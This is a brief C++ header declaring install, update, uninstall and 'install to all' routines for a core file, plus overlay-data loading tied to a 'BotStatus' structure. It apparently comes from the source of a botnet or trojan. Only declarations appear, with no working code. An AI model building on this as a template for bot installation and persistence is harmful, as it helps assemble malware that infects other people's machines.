
#pragma once

#include "..\common\botstatus.h"

namespace CoreInstall
{
  
  void init(void);

  void uninit(void);

  bool _install(const LPWSTR pathHome, LPWSTR coreFile);


  bool _loadInstalledData(const void *overlay, DWORD overlaySize);

  bool _update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR coreFile, bool force);
  

  void _loadUpdateData(BotStatus::VER1 *bs);


  bool _installToAll(void);

  bool _uninstall(bool wait);
};
